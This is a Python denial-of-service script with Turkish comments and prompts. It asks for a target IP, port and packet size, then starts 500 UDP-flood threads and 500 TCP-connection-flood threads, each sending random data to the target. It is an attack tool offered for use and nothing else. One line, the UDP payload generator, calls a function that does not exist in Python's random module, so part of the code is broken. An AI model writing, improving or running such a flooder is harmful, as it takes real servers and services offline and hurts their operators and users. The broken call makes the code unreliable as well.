import socket
import threading
import random
import os

# Görsel Kimlik
os.system("clear")
print("""
\033[1;31m
    ██████╗ ███╗   ███╗███╗   ██╗██╗
    ██╔═══██╗████╗ ████║████╗  ██║██║
    ██║   ██║██╔████╔██║██╔██╗ ██║██║
    ██║   ██║██║╚██╔╝██║██║╚██╗██║██║
    ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║
     ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝
     >>> V4 ULTRA: SPEED + POWER <<<
\033[0m""")

target_ip = input("\033[1;33mHedef IP: \033[0m")
target_port = int(input("\033[1;33mPort: \033[0m"))
power_level = int(input("\033[1;33mPaket Boyutu (Örn: 1024): \033[0m"))

# Rastgele veri üretici (Sunucuyu yoran kısım burası)
def generate_payload(size):
    return random._urllib_quote_plus(os.urandom(size))

def udp_attack():
    # UDP Protokolü: Bağlantı kurmaz, direkt vurur.
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_payload(power_level)
    while True:
        try:
            client.sendto(payload, (target_ip, target_port))
            print(f"\033[1;32m[UDP] SENT -> {target_ip} | SIZE: {power_level}\033[0m")
        except:
            client.close()

def tcp_attack():
    # TCP Protokolü: Sunucu kaynaklarını (Handshake) tüketir.
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Gecikmeyi sıfırlar
            s.connect((target_ip, target_port))
            s.send(os.urandom(power_level))
            print(f"\033[1;34m[TCP] CONNECTED -> {target_ip}\033[0m")
        except:
            pass

# Saldırı Başlatma Paneli
print("\n\033[1;31m[!] Saldırı Başlatılıyor...\033[0m")

# Hibrit Saldırı: Hem UDP hem TCP
for _ in range(500):
    threading.Thread(target=udp_attack, daemon=True).start()
    threading.Thread(target=tcp_attack, daemon=True).start()

# Programın kapanmaması için
input("\n\033[1;37mDurdurmak için Enter'a bas...\033[0m")

